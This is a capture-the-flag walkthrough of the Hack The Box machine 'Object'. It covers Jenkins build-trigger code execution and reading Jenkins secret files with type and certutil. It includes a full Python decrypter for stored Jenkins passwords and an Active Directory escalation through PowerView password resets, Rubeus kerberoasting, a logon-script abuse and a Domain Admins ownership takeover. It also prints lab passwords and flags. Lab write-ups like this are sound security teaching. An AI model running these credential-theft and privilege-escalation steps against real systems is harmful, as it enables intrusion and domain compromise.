# Object

Author [morph3](https://twitter.com/melihkaanyldz)

Object was a windows machine. There is `Jenkins` installed, anyone can register and create projects. By setting custom build options, you can get RCE. There is an AD on the box. After jumping between users and abusing wrong permissions we can get root.  

(I first blooded this box 🩸)
![](https://i.imgur.com/JykWvH6.png)


#### Jenkins

We can register accounts to jenkins

![](https://i.imgur.com/mTjfKfJ.png)


#### Creating a project and setting custom triggers

Jenkins is popular CI/CD pipeline product. We can create projects and set triggers. 

![](https://i.imgur.com/xImlMlr.png)

We can set a schedule to trigger the build. Minimum period is 1 minute so one command per minute.

![](https://i.imgur.com/eDbrigY.png)

![](https://i.imgur.com/PqY13by.png)

#### Recovering admin password

We need three files to recover the admin user's password. `master.key` `hudson.util.Secret` and `config.xml` or `credentials.xml` file. In our case, last item will be `config.xml` of admin user. 


After some enumerations, we find full paths like below for those files.

```
c:\users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret
c:\users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key
c:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml

```


`where /R c:\users\oliver\AppData\Local\Jenkins *.xml`,

![](https://i.imgur.com/6NxmEz7.png)



![](https://i.imgur.com/Z3bovfP.png)

```
type c:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml && type c:\users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key && certutil -encode "c:\users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret" c:\Users\oliver\documents\foo.64 && type "c:\Users\oliver\documents\foo.64" 
```

![](https://i.imgur.com/EovMGAU.png)


`master.key`
```
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
```

base64 encoded `hudson.util.Secret`, 
```
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu
2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHO
kX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2L
AORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9
GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzc
pBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

oliver's encrypted passsword,

```
AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=
```


#### Decrypter script

```python
from hashlib import sha256
from Crypto.Cipher import AES
import base64

import re
import sys
import base64
from hashlib import sha256
from binascii import hexlify, unhexlify
from Crypto.Cipher import AES


"""
# Proving that hudson secret and masterkey works fine
magic = b"::::MAGIC::::"
master_key ="f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
hashed_master_key = sha256(master_key).digest()[:16] # truncate to emulate toAes128Key
hudson_secret_key = open("hudson.util.Secret").read()

o = AES.new(hashed_master_key, AES.MODE_ECB)
x = o.decrypt(hudson_secret_key)

k = x[:-16] # remove the MAGIC
k = k[:16]  # truncate to emulate toAes128Key
"""


def decryptNewPassword(secret, p):
    p = p[1:] #Strip the version
    iv_length = ((p[0] & 0xff) << 24) | ((p[1] & 0xff) << 16) | ((p[2] & 0xff) << 8) | (p[3] & 0xff)
    p = p[4:]
    data_length = ((p[0] & 0xff) << 24) | ((p[1] & 0xff) << 16) | ((p[2] & 0xff) << 8) | (p[3] & 0xff)
    p = p[4:]
    iv = p[:iv_length]
    p = p[iv_length:]
    o = AES.new(secret, AES.MODE_CBC, iv)
    decrypted_p = o.decrypt(p)

    fully_decrypted_blocks = decrypted_p[:-16]
    possibly_padded_block = decrypted_p[-16:]
    padding_length = possibly_padded_block[-1]
    if padding_length <= 16: # Less than size of one block, so we have padding
        possibly_padded_block = possibly_padded_block[:-padding_length]

    pw = fully_decrypted_blocks + possibly_padded_block
    return pw


hudson_secret_key = open("hudson.util.Secret", 'rb').read()
hashed_master_key = sha256(b"f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19").digest()[:16]
o = AES.new(hashed_master_key, AES.MODE_ECB)
secret = o.decrypt(hudson_secret_key)
print(secret)

secret = secret[:-16]
secret = secret[:16]


password = base64.b64decode("AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=")

print(decryptNewPassword(secret, password).decode())


```

```bash
╰─λ python3 dec.py 
b'g[\xe6\x9f\xa8\xe5\x18\x97\xa9\x8d\xe2\x8c\x96\xeb\xd1\x9dB4h\x8e\xdc\xea%P\x87p3,\xc4\x8a\xfc\xf3u?JY?\xb2\xd6\x857:`\x87\x05\x9c\xad@\x98\xc5\xa4$K!\xd9\x05$y\xc6^eX\x88\xf2\xaa\x8a\xa2}\xe2\xee\xb5EQ\xa3P\x03\xf3\xe4\x1aE\x9f\xecEs\xfb\xa2\xd8\xde6\x83\x94\xef|\x03\xfa\x16\xa6\x82\xed7K\xfd1)\xd9\xfb\x8b>L\x1374W\x87<x\xd6\xa7\xabk\xe0\x0f\x1a\xb9\xee[\x8f\'\xed[\x87\x9d\xcdnCq\x95) K\xea\xacwD\xcf\xc1\xfe\xe6\xd5\xf9\xcaZ\xca\x9b\xf8j)az\xb8\xad\xd8\xd2\xba/\xfa2V.\x0c\xb6\xfd\x80t\xe7\xf0\xa8\xae\x1c\x9e\xcatJA\x87\xcdS\xf1e\xb8\x85L5D\xff\x03#\xeb\x19\x80\x1as\x01\xbe\xd7\xc8Z\x82\xe4\xf1\xc6\xe5\x97\xdcf\x18\xd9{\x01\x02Q\x06"\xc6\xe8R3\x17]\xab;\xbf\x805\xe3\x85s\xdf\x9f\rDa{\xdd\xbeG\xdf\xec\xc2_\xbaa\xbb\xa3\xd5q::::MAGIC::::\x03\x03\x03'
c1cdfun_d2434
```

`oliver:c1cdfun_d2434`

#### Winrm to box


```
./evil-winrm.rb -i 10.129.96.74 -u oliver -p c1cdfun_d2434
```

![](https://i.imgur.com/U3GOOdN.png)

`HTB{c1_cd_c00k3d_up_1337!}`

#### Bloodhound & Ad Graph

After running bloodhound we can get the graph below,

Oliver has `ForceChangePassword` permission over Smith.
Smith has `GenericWrite` over Maria.
Maria has `WriteOwner` over "Domain Admins" group.

Pretty straight forward

![](https://i.imgur.com/3gl0gei.png)


#### Abusing ForceChangePassword

We need [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) for necessary functions.

```
upload /opt/PowerView.ps1
Import-Module .\PowerView.ps1
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword
```

![](https://i.imgur.com/89holid.png)


![](https://i.imgur.com/hd8mjuF.png)


#### Abusing GenericWrite

To abuse GenericWrite, we have 2 options. One, we can set a service principal name and we can kerberoast that account. Two, we can set objects like logon script which would get executed on the next time account logs in.


So I monitored the maria's ldap entry a while and as you can see that last time she logged in was when the box had started. She did not seem to be logging in, so the first option seems the correct choice right ? Let's kerberoast her account.

![](https://i.imgur.com/dwLJqEk.png)

#### Kerberoasting


It looks like krbtgt's account is kerberoastable too, I tried this one as well before, but the hash is not crackable.

![](https://i.imgur.com/D6goF2y.png)


We can set a SPN like below,
```
Import-Module .\Powerview.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $SecPassword)

Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='foobar/xd'}
```

It looks like it worked.
![](https://i.imgur.com/egsmCip.png)

Let's kerberoast it using rubeus.
```
.\rubeus.exe kerberoast /creduser:object.local\smith /credpassword:Password123!
```
![](https://i.imgur.com/iuF7iwL.png)



We crack it and own maria you think right ? Jk lol lmao said htb. They actually set a script that executes maria's logon script regularly so maria doesn't really login but her script still gets executes. This made me lost so much time but it would be hard for them to develop that scenario so it's understandable.

![](https://i.imgur.com/EcjGShI.png)



#### Setting the logon script

We can set a logon script like below,
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $SecPassword)

cd C:\\Windows\\System32\\spool\\drivers\\color
echo 'whoami > C:\\Windows\\System32\\spool\\drivers\\color\\poc.txt' > foo.ps1

Set-DomainObject -Credential $Cred -Identity maria -SET @{scriptpath='C:\\Windows\\System32\\spool\\drivers\\color\\foo.ps1'}
```


![](https://i.imgur.com/GxQRYNS.png)

After looking at maria's Desktop folder, there is an excel file named Engines.xls. Let's download it.
![](https://i.imgur.com/TMCZMjH.png)

And `Engines.xls` has the password for maria,
![](https://i.imgur.com/OQQPGAZ.png)


`maria:W3llcr4ft3d_4cls`

#### Abusing WriteOwner

We can change the ownership of "Domain Admins" group like below,
```
$SecPassword = ConvertTo-SecureString 'W3llcr4ft3d_4cls' -AsPlainText -Force;$Cred = New-Object System.Management.Automation.PSCredential('object.local\maria', $SecPassword)

Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity maria
```

Now the owner of the "Domain Admins" object is maria but we still can't add our users to "Domain Admins" group. We also need to give permission to that.

We can check it using bloodhound as well and as you can see that we now own the "Domain Admins".
![](https://i.imgur.com/tYqrH2C.png)

Let's give all rights to maria
```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All -Verbose
net group "Domain Admins" maria /add
```

![](https://i.imgur.com/jOuYED0.png)


Relogin to winrm and we can now read the root flag.

![](https://i.imgur.com/ADUCCUe.png)

`HTB{br0k3n_4c3_4_d00r_t0_k1ngd0m}`
